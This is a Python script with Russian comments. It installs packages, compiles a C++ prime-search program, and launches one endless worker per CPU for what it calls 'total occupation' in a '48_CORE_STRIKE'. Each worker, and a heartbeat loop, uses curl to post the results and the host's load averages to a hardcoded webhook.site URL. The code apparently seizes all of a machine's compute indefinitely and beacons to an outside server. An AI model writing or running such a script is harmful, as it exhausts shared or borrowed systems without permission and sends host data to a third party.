import os
import multiprocessing
import subprocess
import json
import time

WEBHOOK_URL = "https://webhook.site/d9ed8938-0733-4ce3-8d2c-63dab5606e87"

def install_and_compile():
    # 1. Форсированная установка
    os.system("apt-get update && apt-get install -y libgmp-dev g++")
    
    # 2. Нативный код для параллельной работы
    cpp_code = """
    #include <gmp.h>
    #include <iostream>
    #include <time.h>
    #include <unistd.h>

    int main(int argc, char** argv) {
        gmp_randstate_t state;
        gmp_randinit_default(state);
        // Уникальный сид для каждого воркера
        gmp_randseed_ui(state, time(NULL) + getpid() + (argc > 1 ? atoi(argv[1]) : 0));
        
        mpz_t n; mpz_init(n);
        while(true) {
            mpz_urandomb(n, state, 6642); 
            mpz_setbit(n, 6641); mpz_setbit(n, 0);
            if (mpz_probab_prime_p(n, 25) > 0) {
                gmp_printf("%Zd\\n", n);
                break;
            }
        }
        mpz_clear(n); gmp_randclear(state);
        return 0;
    }
    """
    with open("massive_engine.cpp", "w") as f: f.write(cpp_code)
    return os.system("g++ -O3 massive_engine.cpp -o massive_engine -lgmp") == 0

def worker(worker_id):
    while True:
        try:
            # Каждый воркер ищет свое число
            prime = subprocess.check_output(["./massive_engine", str(worker_id)]).decode().strip()
            payload = {
                "EVENT": "48_CORE_STRIKE",
                "WORKER_ID": worker_id,
                "LOAD": os.getloadavg(),
                "DATA": prime
            }
            subprocess.run(['curl', '-s', '-X', 'POST', '-d', json.dumps(payload), WEBHOOK_URL])
        except:
            time.sleep(1)

if __name__ == "__main__":
    if install_and_compile():
        cpus = multiprocessing.cpu_count() # Должно вернуть 48
        print(f"[*] Detected {cpus} CPUs. Launching total occupation...")
        
        for i in range(cpus):
            multiprocessing.Process(target=worker, args=(i,)).start()
            
        # Heartbeat мониторинг
        while True:
            time.sleep(30)
            load = os.getloadavg()
            subprocess.run(['curl', '-s', '-X', 'POST', '-d', 
                          json.dumps({"EVENT": "SYSTEM_LOAD_REPORT", "LOAD": load}), 
                          WEBHOOK_URL])
    else:
        print("[-] Build failed. Check GMP installation.")
